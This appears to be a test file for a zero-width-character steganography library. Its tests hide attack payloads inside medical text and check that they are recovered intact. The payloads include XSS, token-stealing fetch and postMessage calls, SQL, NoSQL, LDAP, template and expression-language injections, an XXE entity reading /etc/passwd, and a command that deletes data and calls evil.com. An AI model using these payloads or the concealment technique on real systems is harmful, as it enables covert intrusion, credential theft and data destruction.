import { expect, test } from 'bun:test'
import zws from '../index'

test('XSS payload injection through encoded medical content', () => {
  const maliciousScript = '<script>steal_cookies()</script>'
  const medicalContent =
    'Patient should take 500mg acetaminophen every 4 hours for pain relief.'

  const weaponizedContent = zws.embed(medicalContent, maliciousScript)
  const extractedPayload = zws.extract(weaponizedContent)

  expect(extractedPayload).toBe(maliciousScript)
  expect(weaponizedContent).toContain('acetaminophen')
  expect(weaponizedContent).not.toContain('<script>')
})

test('Authentication token theft through hidden base64 payload', () => {
  const stealTokenScript = "fetch('/steal',{token:auth})"
  const encodedPayload = btoa(stealTokenScript)
  const medicalText =
    'Diabetes management requires careful blood sugar monitoring.'

  const weaponizedText = zws.embed(medicalText, encodedPayload)
  const recovered = zws.extract(weaponizedText)
  const decodedScript = atob(recovered || '')

  expect(decodedScript).toContain('steal')
  expect(decodedScript).toContain('steal')
  expect(weaponizedText).toContain('Diabetes')
})

test('SQL injection through encoded medication dosage', () => {
  const sqlInjection = "'; DROP TABLE medications; --"
  const dosageInstruction = 'Take 250mg twice daily'

  const weaponizedDosage = zws.embed(dosageInstruction, sqlInjection)
  const extractedSQL = zws.extract(weaponizedDosage)

  expect(extractedSQL).toBe(sqlInjection)
  expect(extractedSQL).toContain('DROP TABLE')
  expect(weaponizedDosage).toContain('250mg')
})

test('Command injection through encoded procedure instructions', () => {
  const commandInjection = '; rm -rf /data; curl evil.com/steal'
  const procedure =
    'Clean wound with sterile saline solution before applying bandage.'

  const weaponizedProcedure = zws.embed(procedure, commandInjection)
  const extractedCommand = zws.extract(weaponizedProcedure)

  expect(extractedCommand).toBe(commandInjection)
  expect(extractedCommand).toContain('rm -rf')
  expect(weaponizedProcedure).toContain('sterile saline')
})

test('Cross-frame scripting through medical iframe content', () => {
  const xfsPayload = 'postMessage({token:getItem("auth")},"*")'
  const medicalReference =
    'Refer to cardiac catheterization guidelines for detailed procedure.'

  const weaponizedReference = zws.embed(medicalReference, xfsPayload)
  const extractedXFS = zws.extract(weaponizedReference)

  expect(extractedXFS).toBe(xfsPayload)
  expect(extractedXFS).toContain('postMessage')
  expect(extractedXFS).toContain('auth')
})

test('Template injection through encoded diagnostic text', () => {
  const templateInjection = "{{constructor.constructor('return env')()}}"
  const diagnostic = 'Blood pressure reading indicates hypertension stage 1.'

  const weaponizedDiagnostic = zws.embed(diagnostic, templateInjection)
  const extractedTemplate = zws.extract(weaponizedDiagnostic)

  expect(extractedTemplate).toBe(templateInjection)
  expect(extractedTemplate).toContain('constructor')
  expect(weaponizedDiagnostic).toContain('hypertension')
})

test('NoSQL injection through patient record encoding', () => {
  const noSQLInjection = '{"$ne": null}'
  const patientNote = 'Patient history shows no known drug allergies.'

  const weaponizedNote = zws.embed(patientNote, noSQLInjection)
  const extractedNoSQL = zws.extract(weaponizedNote)

  expect(extractedNoSQL).toBe(noSQLInjection)
  expect(JSON.parse(extractedNoSQL || '{}')).toHaveProperty('$ne')
  expect(weaponizedNote).toContain('drug allergies')
})

test('LDAP injection through encoded user credentials', () => {
  const ldapInjection = 'admin)(&(objectClass=*'
  const userInfo = 'Dr. Smith, Cardiology Department, Extension 4521'

  const weaponizedUserInfo = zws.embed(userInfo, ldapInjection)
  const extractedLDAP = zws.extract(weaponizedUserInfo)

  expect(extractedLDAP).toBe(ldapInjection)
  expect(extractedLDAP).toContain('objectClass')
  expect(weaponizedUserInfo).toContain('Dr.')
})

test('XML injection through encoded medical report', () => {
  const xmlInjection = '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
  const medicalReport = 'Lab results show elevated white blood cell count.'

  const weaponizedReport = zws.embed(medicalReport, xmlInjection)
  const extractedXML = zws.extract(weaponizedReport)

  expect(extractedXML).toBe(xmlInjection)
  expect(extractedXML).toContain('ENTITY')
  expect(extractedXML).toContain('/etc/passwd')
})

test('Server-side template injection through prescription', () => {
  const sstiPayload = '${7*7}#{7*7}'
  const prescription =
    'Amoxicillin 875mg tablet, take one twice daily for 10 days.'

  const weaponizedPrescription = zws.embed(prescription, sstiPayload)
  const extractedSSTI = zws.extract(weaponizedPrescription)

  expect(extractedSSTI).toBe(sstiPayload)
  expect(extractedSSTI).toContain('${7*7}')
  expect(weaponizedPrescription).toContain('Amoxicillin')
})

test('Expression language injection in medical calculations', () => {
  const elInjection = "${Runtime.getRuntime().exec('calc')}"
  const calculation = 'BMI calculation: weight(kg) / height(m)Â²'

  const weaponizedCalc = zws.embed(calculation, elInjection)
  const extractedEL = zws.extract(weaponizedCalc)

  expect(extractedEL).toBe(elInjection)
  expect(extractedEL).toContain('Runtime.getRuntime()')
  expect(weaponizedCalc).toContain('BMI')
})
